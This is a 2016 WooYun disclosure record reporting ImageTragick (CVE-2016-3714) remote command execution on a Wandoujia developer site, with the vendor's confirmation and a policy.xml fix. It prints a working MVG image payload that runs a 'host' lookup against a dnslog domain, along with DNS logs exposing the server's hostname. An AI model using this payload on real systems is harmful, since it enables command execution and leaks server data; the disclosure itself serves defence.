{"id": 88718, "wybug_id": "wooyun-2016-0214939", "wybug_title": "豌豆荚某站命令执行                                      ", "wybug_corp": "豌豆荚", "wybug_author": "路人甲", "wybug_date": "2016-05-31 22:42", "wybug_open_date": "2016-07-15 23:30", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-15：\t细节向公众公开  简要描述： 之前的都没有修貌似 详细说明：  CVE-2016-3714 以及新的绕过方式参考：http://drops.wooyun.org/papers/15589http://blog.knownsec.com/2016/05/imagemagick-popen-remote-command-execution-vulnerability/开发者站点http://open.wandoujia.com/account/info\n\n认证开发者，营业执照上传处，上传构造好的图片\npush graphic-contextviewbox 0 0 640 480image Over 0,0 0,0 '|host zzz.zzz.dnslog.info'pop graphic-context\n   漏洞证明：  cloudeye中监测到的请求\n31-May-2016 22:23:06.450 queries: client 111.206.15.136#3139 (ag-devcenter0-cnc1.hlg01.xxx.dnslog.info): query: ag-devcenter0-cnc1.hlg01.xxx.dnslog.info IN A -ED (128.199.200.236)31-May-2016 22:23:06.631 queries: client 111.206.14.132#38484 (ag-devcenter0-cnc1.hlg01.xxx.dnslog.info): query: ag-devcenter0-cnc1.hlg01.xxx.dnslog.info IN AAAA -ED (128.199.200.236)31-May-2016 22:23:06.818 queries: client 111.206.14.132#41208 (ag-devcenter0-cnc1.hlg01.xxx.dnslog.info): query: ag-devcenter0-cnc1.hlg01.xxx.dnslog.info IN MX -ED (128.199.200.236)31-May-2016 22:23:10.717 queries: client 111.206.14.132#62669 (ag-devcenter0-cnc1.hlg01.xxx.dnslog.info): query: ag-devcenter0-cnc1.hlg01.xxx.dnslog.info IN A -ED (128.199.200.236)31-May-2016 22:23:10.917 queries: client 111.206.15.136#23942 (ag-devcenter0-cnc1.hlg01.xxx.dnslog.info): query: ag-devcenter0-cnc1.hlg01.xxx.dnslog.info IN AAAA -ED (128.199.200.236)\nag-devcenter0-cnc1.hlg01 为当前服务器主机名   修复方案：  /etc/ImageMagick/policy.xml中添加如下代码——<policymap>  <policy domain=\"coder\" rights=\"none\" pattern=\"EPHEMERAL\" />  <policy domain=\"coder\" rights=\"none\" pattern=\"URL\" />  <policy domain=\"coder\" rights=\"none\" pattern=\"HTTPS\" />  <policy domain=\"coder\" rights=\"none\" pattern=\"MVG\" />  <policy domain=\"coder\" rights=\"none\" pattern=\"MSL\" />  <policy domain=\"path\" rights=\"none\" pattern=\"|*\"/></policymap>   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-05-31 23:24 厂商回复： 漏掉了漏掉了，唉～感谢对豌豆荚安全的关注和帮助～ 最新状态： 2016-06-01：已修复，我们在漏洞报出之前就一直限制了服务器主动访问外网，所以避免了反弹shell，但在host的方法下，还是暴露了～好心塞～  ", "replys": "漏洞评价：\n评价\n     2016-06-01 09:20 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1818 漏洞数:237        | 逆流而上)\t\t \n  厂商很赞啊~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}